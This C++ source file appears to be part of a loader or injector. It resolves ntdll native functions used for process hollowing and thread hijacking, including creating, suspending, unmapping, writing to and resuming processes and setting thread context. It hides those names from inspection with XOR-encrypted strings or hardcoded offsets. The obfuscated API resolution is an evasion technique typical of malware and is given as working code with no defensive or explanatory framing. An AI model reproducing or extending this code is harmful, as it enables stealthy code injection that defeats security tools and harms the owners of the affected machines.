#include "pch.h"
#include "hkutil.h"
#include "hkfunc.h"

// 11111011 11100100 00111000 11000010 01100100 11010011 01111101 11011101
constexpr uint64_t encryptionKey = 18150694805776334301u;

constexpr uint8_t ntdll_ENCRYPTED[] = { 0xC3, 0xC1, 0x41, 0xB2, 0x54 };

#ifndef USE_OFFSET_WINAPI_CALLS
constexpr uint8_t NtAllocateVirtualMemory_ENCRYPTED[] = { 0x35, 0xC1, 0x16, 0x78, 0x66, 0xA1, 0x3D, 0x60, 0x0F, 0xD0, 0x01, 0x7D, 0x78, 0xBA, 0x2B, 0x60, 0x17, 0xF8, 0x32, 0x79, 0x65, 0xBC, 0x27 };
constexpr uint8_t NtCreateProcess_ENCRYPTED[] = { 0xE3, 0xC1, 0x66, 0xAC, 0x5D, 0xFF, 0x58, 0x1A, 0xFD, 0xC7, 0x4A, 0xBD, 0x5D, 0xED, 0x5F };
constexpr uint8_t NtCreateSection_ENCRYPTED[] = { 0x29, 0xF3, 0x36, 0xDE, 0x23, 0x29, 0x58, 0x68, 0x34, 0xE2, 0x16, 0xD8, 0x2F, 0x27, 0x42 };
constexpr uint8_t NtCreateThreadEx_ENCRYPTED[] = { 0x17, 0x79, 0x58, 0xE0, 0x1D, 0xA3, 0x36, 0x56, 0x0D, 0x65, 0x69, 0xF7, 0x19, 0xA6, 0x07, 0x4B };
constexpr uint8_t RtlCreateUserThread_ENCRYPTED[] = { 0x29, 0xC1, 0x3B, 0x57, 0x78, 0xAB, 0x3F, 0x75, 0x1E, 0xE0, 0x24, 0x71, 0x78, 0x9A, 0x36, 0x73, 0x1E, 0xD4, 0x33 };
constexpr uint8_t NtGetContextThread_ENCRYPTED[] = { 0x17, 0x79, 0x5C, 0xF7, 0x0C, 0x81, 0x2D, 0x5D, 0x2D, 0x68, 0x63, 0xE6, 0x2C, 0xAA, 0x30, 0x56, 0x38, 0x69 };
constexpr uint8_t NtMapViewOfSection_ENCRYPTED[] = { 0x65, 0xB3, 0x64, 0xA3, 0x7A, 0xEA, 0xFD, 0x56, 0x5C, 0x88, 0x4F, 0x91, 0x6F, 0xDF, 0xE0, 0x5A, 0x44, 0xA9 };
constexpr uint8_t NtQueryInformationProcess_ENCRYPTED[] = { 0x69, 0xAF, 0x4A, 0x95, 0xD7, 0x82, 0x6B, 0x08, 0x49, 0xBD, 0x74, 0x92, 0xDF, 0x91, 0x66, 0x28, 0x48, 0xB5, 0x4B, 0x92, 0xDD, 0x93, 0x77, 0x32, 0x54 };
constexpr uint8_t NtResumeProcess_ENCRYPTED[] = { 0x35, 0xC1, 0x05, 0x71, 0x79, 0xBB, 0x33, 0x64, 0x2B, 0xC7, 0x38, 0x77, 0x6F, 0xBD, 0x2D };
constexpr uint8_t NtSetContextThread_ENCRYPTED[] = { 0x29, 0xF3, 0x26, 0xC9, 0x32, 0x0B, 0x43, 0x63, 0x13, 0xE2, 0x0D, 0xD8, 0x12, 0x20, 0x5E, 0x68, 0x06, 0xE3 };
constexpr uint8_t NtSuspendProcess_ENCRYPTED[] = { 0x69, 0xAF, 0x48, 0x95, 0xC1, 0x80, 0x77, 0x2F, 0x43, 0x8B, 0x69, 0x8F, 0xD1, 0x95, 0x61, 0x32 };
constexpr uint8_t ZwUnmapViewOfSection_ENCRYPTED[] = { 0x3D, 0xF0, 0x20, 0xC2, 0x2B, 0x29, 0x5C, 0x5B, 0x0E, 0xE2, 0x02, 0xE3, 0x20, 0x1B, 0x49, 0x6E, 0x13, 0xEE, 0x1A, 0xC2 };
constexpr uint8_t NtWriteVirtualMemory_ENCRYPTED[] = { 0x5B, 0x8D, 0xF4, 0xDE, 0x5D, 0xF6, 0x7B, 0x0B, 0x7C, 0x8B, 0xD7, 0xD9, 0x55, 0xEE, 0x53, 0x38, 0x78, 0x96, 0xD1, 0xD5 };
#else
constexpr uint64_t AllocateVirtualMemoryOffset = 656320;
constexpr uint64_t CreateProcessOffset = 661616;
constexpr uint64_t CreateSectionOffset = 657920;
constexpr uint64_t CreateThreadExOffset = 661904;
constexpr uint64_t CreateUserThreadOffset = 377296;
constexpr uint64_t GetContextThreadOffset = 663504;
constexpr uint64_t MapViewOfSectionOffset = 656832;
constexpr uint64_t QueryInformationProcessOffset = 656352;
constexpr uint64_t ResumeProcessOffset = 668080;
constexpr uint64_t SetContextThreadOffset = 668592;
constexpr uint64_t SuspendProcessOffset = 670224;
constexpr uint64_t UnmapViewOfSectionOffset = 656896;
constexpr uint64_t WriteVirtualMemoryOffset = 657408;
#endif

TAllocateVirtualMemory hkAllocateVirtualMemory = nullptr;
TCreateProcess hkCreateProcess = nullptr;
TCreateSection hkCreateSection = nullptr;
TCreateThreadEx hkCreateThreadEx = nullptr;
TCreateUserThread hkCreateUserThread = nullptr;
TGetContextThread hkGetContextThread = nullptr;
TMapViewOfSection hkMapViewOfSection = nullptr;
TQueryInformationProcess hkQueryInformationProcess = nullptr;
TResumeProcess hkResumeProcess = nullptr;
TSetContextThread hkSetContextThread = nullptr;
TSuspendProcess hkSuspendProcess = nullptr;
TUnmapViewOfSection hkUnmapViewOfSection = nullptr;
TWriteVirtualMemory hkWriteVirtualMemory = nullptr;

size_t decryptionIndex = 0;

void initializeWinAPIFunctions() {
  resetDecryptionIndex();

  const std::string ntdllString = decryptString(&ntdll_ENCRYPTED[0], sizeof(ntdll_ENCRYPTED)).c_str();
  const char* pNtDLLString = ntdllString.c_str();

  void* pNtDLL = GetModuleHandleA(pNtDLLString);

#ifndef USE_OFFSET_WINAPI_CALLS
  hkAllocateVirtualMemory = (TAllocateVirtualMemory)util::getFunctionAddress(pNtDLLString, decryptString(&NtAllocateVirtualMemory_ENCRYPTED[0], sizeof(NtAllocateVirtualMemory_ENCRYPTED)).c_str());
  hkCreateProcess = (TCreateProcess)util::getFunctionAddress(pNtDLLString, decryptString(&NtCreateProcess_ENCRYPTED[0], sizeof(NtCreateProcess_ENCRYPTED)).c_str());
  hkCreateSection = (TCreateSection)util::getFunctionAddress(pNtDLLString, decryptString(&NtCreateSection_ENCRYPTED[0], sizeof(NtCreateSection_ENCRYPTED)).c_str());
  hkCreateThreadEx = (TCreateThreadEx)util::getFunctionAddress(pNtDLLString, decryptString(&NtCreateThreadEx_ENCRYPTED[0], sizeof(NtCreateThreadEx_ENCRYPTED)).c_str());
  hkCreateUserThread = (TCreateUserThread)util::getFunctionAddress(pNtDLLString, decryptString(&RtlCreateUserThread_ENCRYPTED[0], sizeof(RtlCreateUserThread_ENCRYPTED)).c_str());
  hkGetContextThread = (TGetContextThread)util::getFunctionAddress(pNtDLLString, decryptString(&NtGetContextThread_ENCRYPTED[0], sizeof(NtGetContextThread_ENCRYPTED)).c_str());
  hkMapViewOfSection = (TMapViewOfSection)util::getFunctionAddress(pNtDLLString, decryptString(&NtMapViewOfSection_ENCRYPTED[0], sizeof(NtMapViewOfSection_ENCRYPTED)).c_str());
  hkQueryInformationProcess = (TQueryInformationProcess)util::getFunctionAddress(pNtDLLString, decryptString(&NtQueryInformationProcess_ENCRYPTED[0], sizeof(NtQueryInformationProcess_ENCRYPTED)).c_str());
  hkResumeProcess = (TResumeProcess)util::getFunctionAddress(pNtDLLString, decryptString(&NtResumeProcess_ENCRYPTED[0], sizeof(NtResumeProcess_ENCRYPTED)).c_str());
  hkSetContextThread = (TSetContextThread)util::getFunctionAddress(pNtDLLString, decryptString(&NtSetContextThread_ENCRYPTED[0], sizeof(NtSetContextThread_ENCRYPTED)).c_str());
  hkSuspendProcess = (TSuspendProcess)util::getFunctionAddress(pNtDLLString, decryptString(&NtSuspendProcess_ENCRYPTED[0], sizeof(NtSuspendProcess_ENCRYPTED)).c_str());
  hkUnmapViewOfSection = (TUnmapViewOfSection)util::getFunctionAddress(pNtDLLString, decryptString(&ZwUnmapViewOfSection_ENCRYPTED[0], sizeof(ZwUnmapViewOfSection_ENCRYPTED)).c_str());
  hkWriteVirtualMemory = (TWriteVirtualMemory)util::getFunctionAddress(pNtDLLString, decryptString(&NtWriteVirtualMemory_ENCRYPTED[0], sizeof(NtWriteVirtualMemory_ENCRYPTED)).c_str());

  uint64_t AllocateVirtualMemoryOffset = (uint64_t)hkAllocateVirtualMemory - (uint64_t)pNtDLL;
  uint64_t CreateProcessOffset = (uint64_t)hkCreateProcess - (uint64_t)pNtDLL;
  uint64_t CreateSectionOffset = (uint64_t)hkCreateSection - (uint64_t)pNtDLL;
  uint64_t CreateThreadExOffset = (uint64_t)hkCreateThreadEx - (uint64_t)pNtDLL;
  uint64_t CreateUserThreadOffset = (uint64_t)hkCreateUserThread - (uint64_t)pNtDLL;
  uint64_t GetContextThreadOffset = (uint64_t)hkGetContextThread - (uint64_t)pNtDLL;
  uint64_t MapViewOfSectionOffset = (uint64_t)hkMapViewOfSection - (uint64_t)pNtDLL;
  uint64_t QueryInformationProcessOffset = (uint64_t)hkQueryInformationProcess - (uint64_t)pNtDLL;
  uint64_t ResumeProcessOffset = (uint64_t)hkResumeProcess - (uint64_t)pNtDLL;
  uint64_t SetContextThreadOffset = (uint64_t)hkSetContextThread - (uint64_t)pNtDLL;
  uint64_t SuspendProcessOffset = (uint64_t)hkSuspendProcess - (uint64_t)pNtDLL;
  uint64_t UnmapViewOfSectionOffset = (uint64_t)hkUnmapViewOfSection - (uint64_t)pNtDLL;
  uint64_t WriteVirtualMemoryOffset = (uint64_t)hkWriteVirtualMemory - (uint64_t)pNtDLL;
#else
  hkAllocateVirtualMemory = (TAllocateVirtualMemory)offsetToFunction(pNtDLL, AllocateVirtualMemoryOffset);
  hkCreateProcess = (TCreateProcess)offsetToFunction(pNtDLL, CreateProcessOffset);
  hkCreateSection = (TCreateSection)offsetToFunction(pNtDLL, CreateSectionOffset);
  hkCreateThreadEx = (TCreateThreadEx)offsetToFunction(pNtDLL, CreateThreadExOffset);
  hkCreateUserThread = (TCreateUserThread)offsetToFunction(pNtDLL, CreateUserThreadOffset);
  hkGetContextThread = (TGetContextThread)offsetToFunction(pNtDLL, GetContextThreadOffset);
  hkMapViewOfSection = (TMapViewOfSection)offsetToFunction(pNtDLL, MapViewOfSectionOffset);
  hkQueryInformationProcess = (TQueryInformationProcess)offsetToFunction(pNtDLL, QueryInformationProcessOffset);
  hkResumeProcess = (TResumeProcess)offsetToFunction(pNtDLL, ResumeProcessOffset);
  hkSetContextThread = (TSetContextThread)offsetToFunction(pNtDLL, SetContextThreadOffset);
  hkSuspendProcess = (TSuspendProcess)offsetToFunction(pNtDLL, SuspendProcessOffset);
  hkUnmapViewOfSection = (TUnmapViewOfSection)offsetToFunction(pNtDLL, UnmapViewOfSectionOffset);
  hkWriteVirtualMemory = (TWriteVirtualMemory)offsetToFunction(pNtDLL, WriteVirtualMemoryOffset);
#endif
}

std::string decryptString(const uint8_t* inEncryptedArray, const size_t inArraySize) {
  std::string decryptedString;
  decryptedString.resize(inArraySize);
  const uint8_t* pEncryptionKey = (uint8_t*)&encryptionKey;

  for (size_t arrayIndex = 0; arrayIndex < inArraySize; ++arrayIndex) {
    decryptedString[arrayIndex] = inEncryptedArray[arrayIndex] ^ pEncryptionKey[(arrayIndex + inArraySize + decryptionIndex * 3) % sizeof(encryptionKey)] << 1;
    decryptedString[arrayIndex] ^= pEncryptionKey[arrayIndex % sizeof(encryptionKey)];
  }

  ++decryptionIndex;
  return decryptedString;
}

void resetDecryptionIndex() {
  decryptionIndex = 0;
}

void* offsetToFunction(void* pLibrary, const uint64_t offset) {
  if (!pLibrary || !offset) {
    return nullptr;
  }

  return (uint8_t*)pLibrary + offset;
}